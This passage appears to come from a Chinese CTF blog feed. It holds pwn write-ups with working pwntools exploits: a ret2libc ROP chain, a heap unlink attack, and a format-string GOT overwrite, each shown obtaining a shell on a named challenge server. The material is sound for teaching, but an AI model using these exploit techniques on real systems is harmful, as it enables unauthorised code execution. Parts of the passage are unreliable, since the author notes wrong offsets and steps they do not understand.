title="思路："></a>思路：</h2><p>整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。</p><h2 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)</span><br><span class="line">#sh = process(&apos;level3&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line">sys_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------# </span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1)    //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。</span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">sh.send(pay1)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">#---------call system func---------------#</span><br><span class="line">sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addr</span><br><span class="line">binsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addr</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; </span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>—之后再做—</p><h1 id="level6-堆的unlink利用"><a href="#level6-堆的unlink利用" class="headerlink" title="level6 - 堆的unlink利用"></a>level6 - 堆的unlink利用</h1><p>正常的选项类型题</p><h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>main:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line"></span><br><span class="line">  alarm_func();</span><br><span class="line">  main_ptr();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = menu();</span><br><span class="line">LABEL_3:</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        list();</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        v0 = menu();</span><br><span class="line">        if ( v0 &gt; 5 )</span><br><span class="line">          goto LABEL_6;</span><br><span class="line">        goto LABEL_3;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">      default:</span><br><span class="line">LABEL_6:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题函数：<br>delete函数未检查inuse位，可以double free，且free完并未清空指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v3; // eax</span><br><span class="line"></span><br><span class="line">  if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( v0 &lt; 0 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  v1 = dword_804A2EC;</span><br><span class="line">  if ( v0 &gt;= *(_DWORD *)dword_804A2EC )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_DWORD *)(dword_804A2EC + 4);</span><br><span class="line">  v3 = v1 + 12 * v0;</span><br><span class="line">  *(_DWORD *)(v3 + 8) = 0;</span><br><span class="line">  *(_DWORD *)(v3 + 12) = 0;</span><br><span class="line">  free(*(void **)(v3 + 16));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。</p><p>保护：（基本上不用看。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/root/pwnprac/freenote_x86&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="思路-有点迷"><a href="#思路-有点迷" class="headerlink" title="思路(有点迷)"></a>思路(有点迷)</h2><p>   首先分配5个大小为0x80的内存块（0,1,2,3,4），之后按顺序free掉3号与1号（这样1号内存的fd指针会指向3号），这样0号内存块就可以使用1号内存块的pre_size 与size 位，但我们可以<br>edit 0号内存块大小为0x90，目的是为了在对齐机制的情况下，系统会分配0x100大小的内存块，但因为需要输入申请内存大小的内容，所以只要0x90，即<br>刚好覆盖1号内存块的pre_size与size位，此时可以打印出1号内存块的fd指针，从而泄露出堆的基地址与0号内存的地址。<br>    之后unlink，因为delete漏洞的存在，1号块可以double free,将0号块卸下。这样子就可以对0号块为所欲为。(不太懂怎么为所欲为的) </p><h2 id="poc（待参透）"><a href="#poc（待参透）" class="headerlink" title="poc（待参透）"></a>poc（待参透）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    cn = process(&quot;./freenote_x86&quot;)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line"></span><br><span class="line">def list_post():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def add_post(length,content):</span><br><span class="line">    cn.sendline(&apos;2&apos;)</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_post(idx,length,content):</span><br><span class="line">    cn.sendline(&apos;3&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_post(idx):</span><br><span class="line">    cn.sendline(&apos;4&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">chunk_list=0x0804A2EC</span><br><span class="line">test=0x08048CC5</span><br><span class="line"></span><br><span class="line">#-------init-------</span><br><span class="line">for i in range(5):</span><br><span class="line">    add_post(0x80,str(i)*0x80)</span><br><span class="line"></span><br><span class="line">del_post(3)</span><br><span class="line">del_post(1)</span><br><span class="line"></span><br><span class="line">pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8</span><br><span class="line">edit_post(0,0x88,pay)</span><br><span class="line">#------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;a&apos;*0x8)</span><br><span class="line">leak_addr = u32(cn.recv(4))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - 0xdb0#offset</span><br><span class="line">chunk0_addr = heap_base + 0x18</span><br><span class="line">success(&quot;leak_addr: &quot;+hex(leak_addr))</span><br><span class="line">success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#-------unlink--------</span><br><span class="line">pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)</span><br><span class="line">pay += p32(0x80) + p32(0x88+0x88)</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">del_post(1)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)</span><br><span class="line">pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])</span><br><span class="line">pay += &apos;\x00&apos;*(0x88-len(pay))</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;0. &apos;)</span><br><span class="line">cn.recvuntil(&apos;1. &apos;)</span><br><span class="line">strtol = cn.recvuntil(&apos;\x0a&apos;)[:-1]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&quot;strtol: &quot;+hex(strtol))</span><br><span class="line">success(&quot;system: &quot;+hex(system))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------hijack&amp;getshell--------</span><br><span class="line">edit_post(1,4,p32(system))</span><br><span class="line">cn.sendline(&quot;$0&quot;)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure><p>获得shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your choice: $ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwn-300-Formatting string vulnerability</title>
      <link href="/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/"/>
      <url>/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/</url>
      <content type="html"><![CDATA[<p><em>pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。</em><br><em>而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。</em></p><h1 id="查看内容及保护"><a href="#查看内容及保护" class="headerlink" title="查看内容及保护"></a>查看内容及保护</h1><h2 id="main函数为："><a href="#main函数为：" class="headerlink" title="main函数为："></a>main函数为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);  //canary生成</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  fgets(&amp;s, 64, stdin);   //fgets,遇/x00停止</span><br><span class="line">  printf(&amp;s);             //格式化字符串漏洞</span><br><span class="line">  fgets(&amp;s, 64, stdin);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h2><p>仍然是canary 与 栈不可执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# checksec binary_300</span><br><span class="line">[*] &apos;/root/tikool/binary_300&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="查看加载函数"><a href="#查看加载函数" class="headerlink" title="查看加载函数"></a>查看加载函数</h2><p>发现system函数</p><figure class="image-box">                <img src="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/system.png" alt="加载函数" title="" class="">                <p>加载函数</p>            </figure><h1 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h1><p>想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell；</p><h1 id="流程实现"><a href="#流程实现" class="headerlink" title="流程实现"></a>流程实现</h1><h2 id="确定字符串位置"><a href="#确定字符串位置" class="headerlink" title="确定字符串位置"></a>确定字符串位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# ./binary_300</span><br><span class="line">aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x </span><br><span class="line">aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e</span><br></pre></td></tr></table></figure><p>即字符串位于第六（相对于<strong>）或第七个（相对于</strong>）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./binary_300&apos;)</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)</span><br><span class="line">libc = ELF(&apos;./binary_300&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = libc.got[&apos;printf&apos;]</span><br><span class="line">system_add = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;)  //pwntools自带，用于生成格式化字符串payload；</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ /bin/sh</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> format </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn 1.3--plt/got</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/</url>
      <content type="html"><![CDATA[<pre><code>&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; </code></pre><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p><ul><li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四">    <img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></li></ul><h1 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h1><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p><p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p><h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol><li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class="">                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>            </figure><ol start="2"><li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class="">                <p>图三</p>            </figure><ol start="3"><li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure><ol start="4"><li>构造payload泄露write函数的实际地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay = &apos;a&apos;*20 + p32(pwn.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(wri_got) + p32(4)</span><br></pre></td></tr></table></figure><ol start="4"><li>泄露libc中的system与/bin/sh地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_addr = wri_addr - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure><ol start="5"><li>构造payload </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*20 + p32(sys_addr) + &apos;bbbb&apos; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p><em>因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.2--UAF</title>
      <link href="/2018/08/28/pwn-%E5%85%A5%E9%97%A8n-n/"/>
      <url>/2018/08/28/pwn-%E5%85%A5%E9%97%A8n-n/</url>
      <content type="html"><![CDATA[<h1 id="堆的UAF-use-after-free-利用"><a href="#堆的UAF-use-after-free-利用" class="headerlink" title="堆的UAF(use after free)利用"></a>堆的UAF(use after free)利用</h1><p><em>学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，<br>先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，<br>只能看了下pwn的tips，开始现学现卖。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；<br>而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。</p><ul><li>根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</li></ul><h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void 